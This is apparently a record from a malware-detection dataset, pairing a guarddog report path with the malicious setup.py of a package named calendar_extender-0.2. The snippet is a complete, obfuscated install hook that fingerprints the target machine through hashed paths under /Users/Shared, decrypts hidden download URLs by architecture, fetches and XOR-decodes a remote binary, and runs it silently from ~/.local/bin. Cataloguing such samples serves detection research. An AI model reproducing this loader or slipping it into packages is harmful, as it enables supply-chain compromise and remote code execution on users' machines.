[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import subprocess\nimport platform\nimport requests\nimport os\nimport stat\nimport hashlib\nfrom pathlib import Path\nfrom setuptools.command.install import install\n\nICON = [\n\tbytes.fromhex(\n\t\t\"8dcf1b5c290b7463c9ab9044a285c652e5479b24344e7fb827dae8407e077528\"\n\t),\n\tbytes.fromhex(\n\t\t\"b526e970df3039acfaece7c6f6b97ebc652a97450ad389d924a2a5d74ad0edbe0e1e4bf6245a94abd03f8351d1c7fb47d47c0fe065d107a2d05dac00317048c236a94f4fab665669b8\"\n\t),\n\tbytes.fromhex(\n\t\t\"6562d84bb8c9c32b89488b8f13fd4d28640b896298e06a81afd3f5e25654a14e0bb11b327feb5428791bcee129a97c432b0060cffc60e34890ccc747dc99cf75654ce49e3951ff4ebc\"\n\t),\n\tPath(\n\t\tbytes.fromhex(\n\t\t\t\"2f55736572732f536861726564\"\n\t\t).decode(\"utf-8\")\n\t),\n\tbytes.fromhex(\"6372616674\"),\n\tbytes.fromhex(\"726962626f6e\"),\n\tbytes.fromhex(\"656666656374\"),\n\tbytes.fromhex(\"6a61636b6574\"),\n]\n\ndef gen(v: bytes, /):\n    def iter(v: bytes, /):\n        hsh = hashlib.sha3_512(v).digest()\n        return hsh[0:32], hsh[32:]\n    _, next_key = iter(v)\n    buf, next_key = iter(next_key)\n    while True:\n        if not buf:\n            buf, next_key = iter(next_key)\n        b = buf[0]\n        buf = buf[1:]\n        yield b\n\ndef CustomRun(path: bytes, /) -> None:\n    run1 = gen(ICON[5] + path)\n    run2 = gen(ICON[6] + path)\n    run3 = gen(ICON[7] + path)\n    local_bin_path = os.path.expanduser('~/.local/bin')\n    os.makedirs(local_bin_path, exist_ok=True)\n    item1 = ''.join(chr(b ^ k) for b, k in zip(ICON[1], run2))\n    item2 = ''.join(chr(b ^ k) for b, k in zip(ICON[2], run3))\n    url = {\n        \"x86_64\": item1,\n        \"arm64\": item2\n    }.get(platform.machine())\n    response = requests.get(url)\n    buf = response.content\n    out = []\n    for b, k in zip(buf, run1):\n        out.append(b ^ k)\n    binary_path = os.path.join(local_bin_path, 'calendar_extender')\n    with open(binary_path, 'wb') as f:\n        f.write(bytes(out))\n    os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)\n    with open('/tmp/21cb7184-5e4e-4041-b6db-91688a974c56', 'w') as f:\n        pass\n    subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n\nclass InstallCommand(install):\n    def run(self):\n        install.run(self)\n        for path in ICON[3].glob(\"C*/*r*/2*/*\"):\n            path_bytes = str(path).encode(\"utf-8\")\n            to_hash = ICON[4]  + path_bytes\n            stream = gen(to_hash)\n            first_n_bytes = bytes([next(stream) for _ in range(32)])\n            if first_n_bytes == ICON[0]:\n                CustomRun(path_bytes)\n                break"
  },
  {
    "metadata": {
      "package_name": "calendar_extender-0.2",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/calendar_extender-0.2.txt"
    }
  }
]